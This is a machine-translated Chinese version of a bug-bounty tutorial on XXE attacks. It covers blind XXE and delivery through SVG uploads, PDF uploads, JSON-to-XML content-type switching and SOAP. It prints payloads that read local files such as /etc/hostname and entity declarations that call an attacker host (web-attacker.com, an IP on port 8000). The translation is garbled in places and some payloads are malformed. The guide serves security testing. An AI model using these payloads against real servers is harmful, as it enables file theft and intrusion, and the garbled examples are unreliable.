<html>
<head>
<title>Uncle Rat’s (Almost) Full Guide To XXE</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">鼠叔(几乎)全XXE指南</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/uncle-rats-almost-full-guide-to-xxe-1955563a6598?source=collection_archive---------1-----------------------#2021-04-19">https://infosecwriteups.com/uncle-rats-almost-full-guide-to-xxe-1955563a6598?source=collection_archive---------1-----------------------#2021-04-19</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><h1 id="bfc1" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated">介绍</h1><p id="4ea8" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">XXE是我最喜欢的攻击类型之一，因为它通常隐藏在地表以下。我们都知道，现在几乎没有人再使用XML文件了，因为JSON甚至YAML已经接管了它。然而，XXE出现在2017年OWASP前10名中的事实确实说明了这种漏洞类型。</p><p id="72b1" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">今天，我们将从圣灵降临者和虫子赏金猎人的角度，来看看我们能想到的所有可能的攻击媒介。保护你的应用程序免受XXE攻击也不简单，所以我希望这能给任何构建web应用程序的人一些如何更好地保护他们的应用程序的想法。</p><h1 id="6f1c" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated">盲人XXE</h1><p id="25a5" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">在我们开始谈论XXE之前，我们需要谈谈XXE袭击的盲点。无论你是一个圣灵降临者、虫类赏金猎人还是道德黑客，寻找盲人XXE而不是普通的XXE总是一个好主意。这将确保您不会错过任何入口点，因为有时我们可能会测试XXE，并认为某个端点不容易受到攻击，因为我们看不到任何返回的数据，而实际上该端点可能容易受到盲XXE攻击。</p><p id="1281" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">盲目XXE意味着您正在成功执行攻击，但您看不到服务器的任何输出。这意味着为了确认我们的攻击是否成功，我们需要向外部服务器发出请求。我通常使用burp collaborator来测试此漏洞，并确保在此之后测试非盲漏洞，以防我们确实有详细的缺陷，但出口过滤已启用或类似情况。出口过滤是指防火墙过滤传出流量，不允许某些传出请求，如HTTP请求。</p><h1 id="6839" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated">但是什么是XXE呢？</h1><p id="ec46" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">我们已经讨论过这个问题，但是要实现XXE，我们需要一个XML处理器在后台工作。XML处理器将接受任何XML文件，并且默认允许包含外部实体。这些实体可以是任何东西，从ls这样的系统命令(甚至可能是一个反向shell？)到/etc/shadow之类的文件。</p><p id="6fb9" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">好消息是，如果我们真的发现了XXE袭击，我们是圣灵降临者还是邪恶的赏金猎人都没关系。如果您可以在系统上找到文件，此问题的严重性将始终至少为中等，如果您可以执行命令，则可能会更高。只要确保你没有忘记证明影响，你不想失去所有这些工作，因为你没有证明任何影响。</p><p id="0420" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">大多数人都知道传统的XML文件是什么样子。</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="a31f" class="ma jr it lw b gy mb mc l md me">&lt;note&gt;<br/>&lt;script/&gt;<br/>&lt;script/&gt;<br/>&lt;to&gt;Tove&lt;/to&gt;<br/>&lt;from&gt;Jani&lt;/from&gt;<br/>&lt;heading&gt;Reminder&lt;/heading&gt;<br/>&lt;body&gt;Don't forget me this weekend!&lt;/body&gt;<br/>&lt;/note&gt;</span></pre><p id="5589" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">如果我们可以将这个XML文件导入到我们的应用程序中来创建一个注释，我们就有了一个XXE攻击的入口点，但是这几乎不会发生！</p><p id="fb82" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">你真的再也看不到太多XML了。大多数应用程序将使用不同类型的数据格式，但该漏洞在2017年10大OWASP列表中排名第四。这是否意味着XML文件再次成为热门话题？不，当然不是！淘汰过时的老技术！</p><p id="76a9" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">还有其他一些XML攻击的入口点，大多数猎人可能没有听说过，或者他们可能没有仔细考虑过。</p><h1 id="82ab" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated">XXE via SVG</h1><p id="2cd2" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">这是我最喜欢的一个，因为几乎每个网站都有上传图片和渲染图片的选项。这就是SVG的本质，尽管它看起来比这更复杂，但事实并非如此。它实际上只是一个图像，但是用XML格式描述。这意味着，如果服务器允许SVG文件，我们可以随时测试XXE。</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="cf7c" class="ma jr it lw b gy mb mc l md me">&lt;svg  xmlns:xlink="&lt;http://www.w3.org/1999/xlink&gt;" width="300" version="1.1" height="200"&gt;&lt;image xlink:href="file:///etc/hostname"&gt;&lt;/image&gt;&lt;/svg&gt;</span></pre><p id="0bcd" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">这个SVG文件将尝试打开文件:///etc/hostname并显示给用户。</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="0cd0" class="ma jr it lw b gy mb mc l md me">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "&lt;http://f2g9j7hhkax.web-attacker.com&gt;"&gt; ]&gt;&lt;svg  xmlns:xlink="&lt;http://www.w3.org/1999/xlink&gt;" width="300" version="1.1" height="200"&gt;&lt;!ENTITY xxe SYSTEM '&lt;http://f2g9j7hhkax.web-attacker.com&gt;'&gt;&lt;/svg&gt;</span></pre><p id="a4d2" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">但是我们也可以从测试失明的XXE开始。我们可以将这些文本保存为“任何内容”。SVG '并尝试将它们上传到我们可以上传图像的任何地方，该图像将呈现在例如个人资料图片或横幅中。</p><h1 id="1187" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated">通过PDF的XXE</h1><p id="eab1" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">攻击一个目标有时意味着变得有创造性…非常有创造性。这可能看起来不太明显，但我们也可以通过PDF上传功能测试XXE。同样，目标将需要渲染PDF来测试XXE攻击，因为如果您可以简单地上传PDF文件，但它永远不会渲染，那么服务器也永远不会尝试渲染您的XML攻击字符串。</p><p id="70bb" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">根据<a class="ae mf" href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#pdf-file-upload" rel="noopener ugc nofollow" target="_blank"> hacktricks </a>如果以下攻击字符串被接受，我们还可以检查XML输入是否被接受。</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="ba03" class="ma jr it lw b gy mb mc l md me">POST /action HTTP/1.0<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 7</span><span id="b4c1" class="ma jr it lw b gy mg mc l md me">foo=bar</span></pre><p id="548f" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">然后，我们可以尝试是否也接受XML输入</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="0464" class="ma jr it lw b gy mb mc l md me">POST /action HTTP/1.0<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 7</span><span id="3d5b" class="ma jr it lw b gy mg mc l md me">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;foo&gt;bar&lt;/foo&gt;</span></pre><p id="70d7" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">随后，我们可以添加我们的XXE攻击字符串，当然，前提是XML输入被接受和处理。</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="8a7a" class="ma jr it lw b gy mb mc l md me">POST /action HTTP/1.0<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 7</span><span id="11ab" class="ma jr it lw b gy mg mc l md me">&lt;!ENTITY xxe SYSTEM '&lt;http://f2g9j7hhkax.web-attacker.com&gt;'&gt;</span></pre><h1 id="cc23" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated">JSON到XXE</h1><p id="bd18" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">如今大多数web应用程序都接受JSON作为输入，这似乎很好地覆盖了XXE的大多数入口，因为如果我们不能处理XML文件；执行以XML格式为基础的攻击真的很难。还是会？它可能不像许多人认为的那样万无一失。</p><p id="a451" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated"><a class="ae mf" href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#content-type-from-json-to-xee" rel="noopener ugc nofollow" target="_blank">https://book . hack tricks . XYZ/pentesting-web/xxe-xee-XML-external-entity # content-type-from-JSON-to-xee</a></p><p id="a461" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">根据hacktricks，我们可以简单地改变内容类型头。这将利用一些服务器默认内置XML处理器的事实，如果开发人员从未禁用它们，我们可以使用它们来插入XXE攻击媒介。让我们看看hacktricks给我们的例子。</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="6b76" class="ma jr it lw b gy mb mc l md me">Content-Type: application/json;charset=UTF-8</span><span id="7d96" class="ma jr it lw b gy mg mc l md me">{"root": {"root": {<br/>  "firstName": "Avinash",<br/>  "lastName": "",<br/>  "country": "United States",<br/>  "city": "ddd",<br/>  "postalCode": "ddd"<br/>}}}</span></pre><p id="01b6" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">我们可以简单地改变内容类型，并测试这是否仍然有效，以及内容是否将由web服务器处理。</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="4d0a" class="ma jr it lw b gy mb mc l md me">Content-Type: application/json;charset=UTF-8</span><span id="3a9e" class="ma jr it lw b gy mg mc l md me">Will change to</span><span id="bebc" class="ma jr it lw b gy mg mc l md me">Content-Type: application/xml;charset=UTF-8</span></pre><p id="cfd5" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">这当然意味着我们还必须将主体更改为XML格式。为此，我使用了一个JSON到XML的转换器。</p><p id="63aa" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated"><a class="ae mf" href="https://www.freeformatter.com/json-to-xml-converter.html" rel="noopener ugc nofollow" target="_blank">https://www.freeformatter.com/json-to-xml-converter.html</a></p><figure class="lr ls lt lu gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mh"><img src="../Images/17fd0bffd80306eefeae4fbc19002f2e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xHJYXo7CDxNU1vH_coH_VQ.png"/></div></div></figure><p id="b91b" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">综合所有这些，我们得到</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="3b2a" class="ma jr it lw b gy mb mc l md me">Content-Type: application/xml;charset=UTF-8</span><span id="b576" class="ma jr it lw b gy mg mc l md me">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;<br/>&lt;root&gt;<br/> &lt;root&gt;<br/>  &lt;firstName&gt;dsfsdfsdf&lt;/firstName&gt;<br/>  &lt;lastName/&gt;<br/>  &lt;country&gt;United States&lt;/country&gt;<br/>  &lt;city&gt;ddd&lt;/city&gt;<br/>  &lt;postalCode&gt;ddd&lt;/postalCode&gt;<br/> &lt;/root&gt;<br/>&lt;/root&gt;</span></pre><p id="c8ca" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">我们也可以使用名为“Content Type Converter”的Burp扩展，不过我想至少解释一下如何手动完成这项工作。</p><p id="2928" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">如果服务器也接受这个请求，我们可以尝试输入我们的XXE攻击向量。</p><pre class="lr ls lt lu gt lv lw lx ly aw lz bi"><span id="b471" class="ma jr it lw b gy mb mc l md me">Content-Type: application/xml;charset=UTF-8</span><span id="2459" class="ma jr it lw b gy mg mc l md me">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;<br/>&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM "&lt;http://34.229.92.127:8000/TEST.ext&gt;" &gt;]&gt; <br/>&lt;root&gt;<br/> &lt;root&gt;<br/>  &lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;<br/>  &lt;lastName/&gt;<br/>  &lt;country&gt;United States&lt;/country&gt;<br/>  &lt;city&gt;ddd&lt;/city&gt;<br/>  &lt;postalCode&gt;ddd&lt;/postalCode&gt;<br/> &lt;/root&gt;<br/>&lt;/root&gt;</span></pre><p id="187e" class="pw-post-body-paragraph ko kp it kq b kr lm kt ku kv ln kx ky kz lo lb lc ld lp lf lg lh lq lj lk ll im bi translated">在本例中，仅测试了第一个节点“Firstname ”,但我们当然需要测试所有节点，因为XXE可能发生在每个节点上。这是因为开发人员要么必须在一些XML处理器上单独保护每个节点。</p><h1 id="e838" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated">通过SOAP访问XXE</h1><p id="434b" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">SOAP代表简单对象访问协议，它基本上是另一种协议，如HTTP或FTP，但SOAP使用类似XML的结构进行通信。你们中眼尖的人可能已经猜到SOAP也可能容易受到XXE攻击，但是我们将再次确保我们测试每一个节点。在SOAP中，每个节点都必须由开发人员保护，因此我们也可以在这里测试其他东西，如SQLi和XSS。</p><h1 id="86fb" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated">剥削和更多</h1><p id="d1a5" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">这是关于XXE的文件的免费版本，只需2美元(低于一杯咖啡的价格)就可以获得包括视频报道在内的完整版本，请前往https://gum.co/ZbQkN的<a class="ae mf" href="https://gum.co/ZbQkN" rel="noopener ugc nofollow" target="_blank"/></p></div></div>    
</body>
</html>